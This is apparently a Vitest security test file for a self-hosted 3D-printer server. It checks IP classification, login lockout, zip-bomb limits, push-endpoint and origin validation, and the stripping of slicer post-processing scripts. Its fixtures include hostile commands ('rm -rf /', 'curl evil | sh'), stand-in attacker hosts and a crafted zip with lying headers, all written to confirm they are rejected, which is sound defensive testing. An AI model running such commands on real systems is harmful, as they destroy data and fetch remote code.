import { afterAll, beforeAll, beforeEach, describe, expect, it } from 'vitest';
import type { FastifyInstance } from 'fastify';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { zipSync } from 'fflate';
import { isPushEndpoint } from '@printhub/shared';
import { buildApp } from '../src/app.js';
import { openDb } from '../src/db/index.js';
import { SecretBox } from '../src/crypto.js';
import { AuthService } from '../src/auth/service.js';
import { isPrivateIp } from '../src/net.js';
import { ZipLimitError, unzipLimited, unzipLimitedSync } from '../src/zip.js';
import { cliProfiles, readUpload, withoutScripts } from '../src/slicer/profiles.js';

const PW = 'ein-sehr-langes-passwort';

describe('isPrivateIp', () => {
  it.each([
    ['127.0.0.1', true],
    ['10.1.2.3', true],
    ['172.16.0.1', true],
    ['172.31.255.255', true],
    ['172.32.0.1', false],
    ['192.168.1.20', true],
    ['::ffff:192.168.1.20', true],
    ['::1', true],
    ['fd12:3456::1', true],
    ['fe80::1', true],
    ['8.8.8.8', false],
    ['2001:db8::1', false],
    ['::ffff:8.8.8.8', false],
    ['unknown', false],
  ])('%s -> %s', (ip, expected) => {
    expect(isPrivateIp(ip)).toBe(expected);
  });
});

describe('login lockout', () => {
  let auth: AuthService;
  const at = (ip: string) => ({ ip, userAgent: 'test' });
  const fail = (ip: string) => expect(auth.login('admin', 'falsch', undefined, at(ip))).rejects.toMatchObject({ code: 'invalid_credentials' });

  beforeEach(async () => {
    const { db } = openDb(fs.mkdtempSync(path.join(os.tmpdir(), 'printhub-test-')));
    auth = new AuthService(db, new SecretBox('x'.repeat(32)), 60_000, 'PrintHub');
    await auth.setup('admin', PW, at('127.0.0.1'));
  });

  it('locks only the address that guessed wrong', async () => {
    for (let i = 0; i < 5; i++) await fail('203.0.113.1');
    await expect(auth.login('admin', PW, undefined, at('203.0.113.1'))).rejects.toMatchObject({ code: 'locked' });
    await expect(auth.login('admin', PW, undefined, at('198.51.100.7'))).resolves.toBeTruthy();
  });

  it('locks the account for outside addresses after many failures, never for the LAN', async () => {
    for (let n = 0; n < 20; n++) await fail(`203.0.113.${n + 1}`);
    await expect(auth.login('admin', PW, undefined, at('198.51.100.7'))).rejects.toMatchObject({ code: 'locked' });
    await expect(auth.login('admin', PW, undefined, at('192.168.1.50'))).resolves.toBeTruthy();
  });
});

describe('archives', () => {
  /** A zip whose entry claims to be tiny but really inflates to 20 MB. */
  function lyingZip(): Uint8Array {
    const z = zipSync({ 'a.stl': new Uint8Array(20e6) }, { level: 9 });
    const dv = new DataView(z.buffer);
    dv.setUint32(22, 1000, true);
    for (let i = z.length - 22; i > 0; i--) {
      if (dv.getUint32(i, true) === 0x02014b50) {
        dv.setUint32(i + 24, 1000, true);
        break;
      }
    }
    return z;
  }

  it('rejects archives that unpack beyond the limit', async () => {
    const big = zipSync({ 'a.stl': new Uint8Array(3e6), 'b.stl': new Uint8Array(3e6) });
    expect(() => unzipLimitedSync(big, { maxBytes: 5e6 })).toThrow(ZipLimitError);
    await expect(unzipLimited(big, { maxBytes: 5e6 })).rejects.toBeInstanceOf(ZipLimitError);
    expect(Object.keys(unzipLimitedSync(big, { maxBytes: 7e6 }))).toEqual(['a.stl', 'b.stl']);
  });

  it('never inflates past the declared size', async () => {
    expect(unzipLimitedSync(lyingZip(), { maxBytes: 5e6 })['a.stl']!.length).toBe(1000);
    expect((await unzipLimited(lyingZip(), { maxBytes: 5e6 }))['a.stl']!.length).toBe(1000);
  });

  it('skips entries that are not wanted or beyond the file limit', async () => {
    const z = zipSync({ 'a.stl': new Uint8Array(10), 'b.txt': new Uint8Array(10), 'c.stl': new Uint8Array(10), 'd.stl': new Uint8Array(10) });
    const out = await unzipLimited(z, { maxBytes: 1e6, maxFiles: 2, accept: (n) => n.endsWith('.stl') });
    expect(Object.keys(out)).toEqual(['a.stl', 'c.stl']);
  });

  it('refuses oversized profile bundles', () => {
    const z = zipSync({ 'p.json': new Uint8Array(60 * 1024 * 1024).fill(32) });
    expect(() => readUpload('bundle.zip', Buffer.from(z))).toThrow(/zu groß/);
  });
});

describe('profiles', () => {
  it('never hands post-processing scripts to the slicer', () => {
    expect(withoutScripts({ post_process: ['rm -rf /'], layer_height: 0.2 })).toEqual({ layer_height: 0.2 });
    const cli = cliProfiles(
      { name: 'M', settings: { post_process: ['x'] }, systemPrinter: 'S' },
      { post_process: ['curl evil | sh'], layer_height: 0.2 },
      { post_process: ['y'] },
    );
    expect(cli.process.post_process).toEqual([]);
    expect(cli.machine).not.toHaveProperty('post_process');
    expect(cli.filament).not.toHaveProperty('post_process');
  });
});

describe('push endpoints', () => {
  it('accepts the browsers push services only', () => {
    expect(isPushEndpoint('https://fcm.googleapis.com/fcm/send/abc')).toBe(true);
    expect(isPushEndpoint('https://updates.push.services.mozilla.com/wpush/v2/abc')).toBe(true);
    expect(isPushEndpoint('https://web.push.apple.com/abc')).toBe(true);
    expect(isPushEndpoint('https://wns2-par02p.notify.windows.com/w/?token=abc')).toBe(true);
    expect(isPushEndpoint('http://fcm.googleapis.com/fcm/send/abc')).toBe(false);
    expect(isPushEndpoint('https://192.168.1.1/admin')).toBe(false);
    expect(isPushEndpoint('https://googleapis.com.evil.example/x')).toBe(false);
  });
});

describe('first setup and websocket over HTTP', () => {
  let app: FastifyInstance;
  beforeAll(async () => {
    app = await buildApp();
  });
  afterAll(async () => {
    await app.close();
  });

  const setup = (remoteAddress: string, headers: Record<string, string> = {}) =>
    app.inject({
      method: 'POST',
      url: '/api/auth/setup',
      remoteAddress,
      headers: { 'content-type': 'application/json', 'x-printhub-request': '1', ...headers },
      payload: { username: 'admin', password: PW },
    });

  it('only lets the local network create the first account', async () => {
    const state = await app.inject({ url: '/api/auth/state', remoteAddress: '203.0.113.9' });
    expect(state.json()).toEqual({ state: 'setup_required', fromLan: false });
    expect((await setup('203.0.113.9')).statusCode).toBe(403);
    // An untrusted reverse proxy in the LAN forwarding an outside visitor.
    expect((await setup('192.168.1.5', { 'x-forwarded-for': '203.0.113.9' })).statusCode).toBe(403);
    expect((await setup('192.168.1.30')).statusCode).toBe(200);
  });

  it('refuses websocket handshakes from other origins', async () => {
    const res = await app.inject({ url: '/api/ws', remoteAddress: '192.168.1.30', headers: { origin: 'https://evil.example' } });
    expect(res.statusCode).toBe(403);
  });
});
